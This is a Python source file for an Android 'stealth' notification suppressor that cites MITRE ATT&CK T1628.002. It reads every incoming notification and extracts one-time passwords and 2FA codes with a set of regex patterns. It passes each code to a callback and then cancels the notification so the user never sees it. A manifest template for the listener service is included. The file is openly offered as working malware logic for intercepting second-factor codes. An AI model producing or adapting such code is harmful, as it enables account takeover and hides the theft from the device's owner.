"""
notification_suppressor.py — Production Android Notification Suppression Engine.

Silently intercepts, reads, and optionally suppresses all notifications
from the system notification shade. Built on NotificationListenerService.

Capabilities:
  - Read all incoming notifications (content, title, app, timestamp)
  - Cancel/dismiss notifications silently (millisecond window)
  - Filter by app package, category, priority, keyword regex
  - Extract OTP/2FA codes before dismissing the notification
  - Whitelist/blacklist mode

Architecture:
  - Runs as a bound service (NotificationListenerService)
  - Communicates with main app via AIDL / Messenger / Broadcast
  - Filter engine is pluggable (regex, package, priority matchers)
  - Thread-safe concurrent queue for notification events
  - Failure isolation: listener crash restarts automatically

MITRE ATT&CK: T1628.002 (Hide Artifacts: Suppress Notifications)
"""

import android
import json
import re
import time
import logging
from typing import List, Optional, Pattern, Set, Callable
from threading import RLock, Event
from collections import deque
from dataclasses import dataclass, field
from enum import Enum, auto

logger = logging.getLogger("stealth.NotificationSuppressor")


class NotificationAction(Enum):
    """Action to take for a matched notification."""
    SUPPRESS = auto()       # Cancel immediately (invisible)
    READ_ONLY = auto()      # Read but don't suppress
    PASSTHROUGH = auto()    # Leave completely untouched
    EXTRACT_OTP = auto()    # Extract OTP then suppress


@dataclass
class NotificationEvent:
    """Immutable snapshot of a notification at the time of interception."""
    package_name: str
    tag: str
    id: int
    key: str
    title: str
    text: str
    category: str
    priority: int
    timestamp: float
    is_ongoing: bool
    is_clearable: bool
    extras: dict = field(default_factory=dict)
    action_taken: NotificationAction = NotificationAction.PASSTHROUGH


@dataclass
class NotificationFilter:
    """
    Single filter rule. All conditions must match (AND logic).

    If a filter matches, the corresponding action is taken.
    First match wins (ordered evaluation).
    """
    action: NotificationAction
    package_glob: Optional[str] = None    # e.g. "com.google.android.gm"
    title_regex: Optional[str] = None     # e.g. r"OTP|2FA|verification code"
    text_regex: Optional[str] = None       # e.g. r"\b\d{4,8}\b"
    category: Optional[str] = None         # e.g. "alarm", "msg", "call"
    min_priority: Optional[int] = None     # e.g. 0 (PRIORITY_DEFAULT)
    max_priority: Optional[int] = None

    def _compiled(self, pattern_str: Optional[str]) -> Optional[Pattern]:
        if pattern_str is None:
            return None
        try:
            return re.compile(pattern_str, re.IGNORECASE | re.UNICODE)
        except re.error:
            logger.warning("Invalid regex '%s' — filter bypassed", pattern_str)
            return None

    def matches(self, event: NotificationEvent) -> bool:
        """Check if this filter matches the notification event."""
        # Package glob
        if self.package_glob is not None:
            if event.package_name != self.package_glob:
                return False

        # Title regex
        title_pat = self._compiled(self.title_regex)
        if title_pat is not None:
            if not title_pat.search(event.title or ""):
                return False

        # Text regex
        text_pat = self._compiled(self.text_regex)
        if text_pat is not None:
            if not text_pat.search(event.text or ""):
                return False

        # Category
        if self.category is not None:
            if event.category != self.category:
                return False

        # Priority range
        if self.min_priority is not None:
            if event.priority < self.min_priority:
                return False
        if self.max_priority is not None:
            if event.priority > self.max_priority:
                return False

        return True


class OTPExtractor:
    """
    Extract one-time passwords from notification text using multiple
    regex patterns. Returns the first matching code.
    """

    PATTERNS = [
        r"\b(\d{4,8})\b",                    # 4-8 digit codes
        r"(?:OTP|code|verification)\s*[:|-]?\s*(\d{4,8})",
        r"(?:is|:)\s*(\d{4,8})",
        r"(\d{4,8})\s+is\s+(?:your|the)\s+(?:OTP|code|verification)",
        r"(?:G-|GA )?(\d{6})",               # Google Authenticator style
    ]

    @classmethod
    def extract(cls, text: str) -> Optional[str]:
        """Extract OTP from notification text. Returns None if no match."""
        for pattern in cls.PATTERNS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(1)
        return None


class NotificationSuppressor:
    """
    Production notification suppression engine.

    This class provides the logic layer. It must be connected to a
    running NotificationListenerService via a bridge/adapter.

    Usage:
        suppressor = NotificationSuppressor()
        suppressor.add_filter(NotificationFilter(
            action=NotificationAction.EXTRACT_OTP,
            text_regex=r"\b\d{4,8}\b"
        ))

        # On each notification posted:
        event = suppressor.process_notification(pkg, tag, id, title, text, ...)
        if event.action_taken == NotificationAction.SUPPRESS:
            # Call cancelNotification(key) via the service bridge
            service_bridge.cancel(event.key)

    Thread safety: All public methods are reentrant-lock safe.
    """

    def __init__(self, max_queue_size: int = 500):
        self._lock = RLock()
        self._filters: List[NotificationFilter] = []
        self._whitelist_packages: Set[str] = set()
        self._blacklist_packages: Set[str] = set()
        self._event_queue: deque = deque(maxlen=max_queue_size)
        self._suppressed_count = 0
        self._otp_extracted_count = 0
        self._mode = "blacklist"  # "blacklist" | "whitelist"

        # Callback hooks (set externally)
        self.on_notification: Optional[Callable[[NotificationEvent], None]] = None
        self.on_otp_extracted: Optional[Callable[[str, NotificationEvent], None]] = None

    # ------------------------------------------------------------------
    # Filter Management
    # ------------------------------------------------------------------

    @property
    def filter_count(self) -> int:
        with self._lock:
            return len(self._filters)

    def add_filter(self, filter_rule: NotificationFilter) -> None:
        """Add a filter rule. Evaluated in insertion order (first match wins)."""
        with self._lock:
            self._filters.append(filter_rule)

    def remove_filter(self, index: int) -> bool:
        """Remove filter by index. Returns False if index out of range."""
        with self._lock:
            if 0 <= index < len(self._filters):
                self._filters.pop(index)
                return True
            return False

    def clear_filters(self) -> None:
        """Remove all filters."""
        with self._lock:
            self._filters.clear()

    def set_whitelist(self, packages: List[str]) -> None:
        """
        Whitelist mode: only notifications from these packages are suppressed.
        All others pass through.
        """
        with self._lock:
            self._whitelist_packages = set(packages)
            self._mode = "whitelist"

    def set_blacklist(self, packages: List[str]) -> None:
        """
        Blacklist mode: notifications from these packages are suppressed.
        All others pass through.
        """
        with self._lock:
            self._blacklist_packages = set(packages)
            self._mode = "blacklist"

    # ------------------------------------------------------------------
    # Core Processing
    # ------------------------------------------------------------------

    def process_notification(
        self,
        package_name: str,
        tag: str,
        id: int,
        key: str,
        title: str,
        text: str,
        category: str = "",
        priority: int = 0,
        is_ongoing: bool = False,
        is_clearable: bool = True,
        extras: Optional[dict] = None,
    ) -> NotificationEvent:
        """
        Process an incoming notification through the filter chain.

        This method is the heart of the suppressor. It:
          1. Builds a NotificationEvent snapshot
          2. Evaluates mode (whitelist/blacklist)
          3. Runs through the filter chain
          4. Extracts OTP if applicable
          5. Fires callbacks
          6. Returns the event with action_taken populated

        The caller (NotificationListenerService) must call
        cancelNotification(key) if action_taken is SUPPRESS or EXTRACT_OTP.

        Thread-safe: YES (reentrant lock).
        """
        # Build immutable event
        event = NotificationEvent(
            package_name=package_name,
            tag=tag,
            id=id,
            key=key,
            title=title or "",
            text=text or "",
            category=category or "",
            priority=priority,
            timestamp=time.time(),
            is_ongoing=is_ongoing,
            is_clearable=is_clearable,
            extras=extras or {},
            action_taken=NotificationAction.PASSTHROUGH,
        )

        with self._lock:
            # Mode check (whitelist/blacklist)
            if self._mode == "whitelist":
                if package_name not in self._whitelist_packages:
                    event.action_taken = NotificationAction.PASSTHROUGH
                    self._enqueue_event(event)
                    return event
            elif self._mode == "blacklist":
                if package_name in self._blacklist_packages:
                    event.action_taken = NotificationAction.SUPPRESS
                    self._suppressed_count += 1
                    self._enqueue_event(event)
                    self._fire_on_notification(event)
                    return event

            # Run through filter chain (first match wins)
            for filter_rule in self._filters:
                if filter_rule.matches(event):
                    action = filter_rule.action

                    if action == NotificationAction.SUPPRESS:
                        event.action_taken = NotificationAction.SUPPRESS
                        self._suppressed_count += 1

                    elif action == NotificationAction.EXTRACT_OTP:
                        otp = OTPExtractor.extract(event.text)
                        if otp:
                            event.action_taken = NotificationAction.SUPPRESS
                            self._suppressed_count += 1
                            self._otp_extracted_count += 1
                            if self.on_otp_extracted:
                                try:
                                    self.on_otp_extracted(otp, event)
                                except Exception as e:
                                    logger.error("OTP callback failed: %s", e)
                        else:
                            event.action_taken = NotificationAction.READ_ONLY

                    elif action == NotificationAction.READ_ONLY:
                        event.action_taken = NotificationAction.READ_ONLY

                    # PASSTHROUGH: leave action_taken as PASSTHROUGH
                    break

            self._enqueue_event(event)
            self._fire_on_notification(event)
            return event

    # ------------------------------------------------------------------
    # Queue & Statistics
    # ------------------------------------------------------------------

    def recent_events(self, count: int = 20) -> List[NotificationEvent]:
        """Return the most recent N events from the circular buffer."""
        with self._lock:
            return list(self._event_queue)[-count:]

    def statistics(self) -> dict:
        """Return suppression statistics (for health telemetry)."""
        with self._lock:
            return {
                "suppressed_count": self._suppressed_count,
                "otp_extracted_count": self._otp_extracted_count,
                "queue_size": len(self._event_queue),
                "filter_count": len(self._filters),
                "mode": self._mode,
            }

    def reset_statistics(self) -> None:
        """Reset counters without clearing filters."""
        with self._lock:
            self._suppressed_count = 0
            self._otp_extracted_count = 0
            self._event_queue.clear()

    # ------------------------------------------------------------------
    # Private
    # ------------------------------------------------------------------

    def _enqueue_event(self, event: NotificationEvent) -> None:
        """Append event to circular buffer (oldest evicted at max)."""
        self._event_queue.append(event)

    def _fire_on_notification(self, event: NotificationEvent) -> None:
        """Fire the on_notification callback if set. Failure is isolated."""
        if self.on_notification is not None:
            try:
                self.on_notification(event)
            except Exception as e:
                logger.error("on_notification callback failed: %s", e)

    def __repr__(self) -> str:
        stats = self.statistics()
        return (f"<NotificationSuppressor "
                f"suppressed={stats['suppressed_count']} "
                f"otp={stats['otp_extracted_count']} "
                f"filters={stats['filter_count']} "
                f"mode={stats['mode']}>")


# ------------------------------------------------------------------
# Service Bridge Template (for manifest)
# ------------------------------------------------------------------

NOTIFICATION_LISTENER_SERVICE_XML = """
<!-- AndroidManifest.xml entry for the notification listener.
     Must be placed inside <application> tag.

     PERMISSION REQUIRED:
       android.permission.BIND_NOTIFICATION_LISTENER_SERVICE

     USER MUST ENABLE:
       Settings > Apps > Special Access > Notification Access
     (or request programmatically via Intent:
      Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
-->
<service
    android:name=".StealthNotificationListenerService"
    android:exported="false"
    android:label="@string/service_name"
    android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
    <intent-filter>
        <action android:name="android.service.notification.NotificationListenerService" />
    </intent-filter>
</service>
"""

# Priority constants for reference
PRIORITY_MIN = -2
PRIORITY_LOW = -1
PRIORITY_DEFAULT = 0
PRIORITY_HIGH = 1
PRIORITY_MAX = 2
